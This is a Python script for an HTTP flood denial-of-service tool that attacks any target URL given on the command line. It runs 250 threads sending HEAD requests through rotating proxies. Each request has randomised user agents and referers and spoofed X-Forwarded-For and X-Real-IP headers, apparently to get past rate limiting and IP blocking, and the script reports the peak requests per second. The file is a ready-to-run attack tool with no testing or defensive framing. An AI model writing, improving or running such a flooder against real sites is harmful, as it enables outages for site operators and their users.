import requests
import random
import threading
import time
import sys
import httpx

# Load files
def load_file(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# Load user agents, referers, and proxies
user_agents = load_file('ua.txt') or ["Mozilla/5.0"]
referers = load_file('refs.txt') or ["https://google.com"]
proxies = load_file('proxy.txt') + load_file('proxies.txt')

# Random IP generator for headers
def random_ip():
    return '.'.join(str(random.randint(1, 255)) for _ in range(4))

# Generate random headers for requests
def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
    }

# Send flood requests function
def send_flood(target, time_limit, max_threads):
    attempted, success, failed = 0, 0, 0
    lock = threading.Lock()
    start_time = time.time()

    def attack():
        nonlocal attempted, success, failed
        while time.time() - start_time < time_limit:
            headers = generate_headers()
            proxy = random.choice(proxies) if proxies else None

            try:
                if proxy:
                    proxies_format = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    res = requests.head(target, headers=headers, proxies=proxies_format, timeout=3)
                else:
                    with httpx.Client(http2=True, timeout=3) as client:
                        res = client.head(target, headers=headers)
                
                with lock:
                    attempted += 1
                    if res.status_code < 500:
                        success += 1
                    else:
                        failed += 1

            except Exception:
                with lock:
                    attempted += 1
                    failed += 1

    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join(timeout=time_limit)

    elapsed = round(time.time() - start_time, 2)
    if elapsed > 20:
        elapsed = 20

    peak = round(attempted / elapsed, 2)
    return attempted, success, failed, peak, elapsed

# Running the flood
def run_flood(target, duration):
    total, success, failed, peak, elapsed = send_flood(target, duration, 250)
    print(f"Total Requests Sent: {total}")
    print(f"Success Requests: {success}")
    print(f"Failed Requests: {failed}")
    print(f"Peak RPS: {peak}")
    print(f"Total Time Taken: {elapsed} seconds")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 main.py <target_url> <duration_in_seconds>")
        sys.exit(1)

    target_url = sys.argv[1]
    duration = int(sys.argv[2])

    # Run flood directly from VPS
    run_flood(target_url, duration)
    
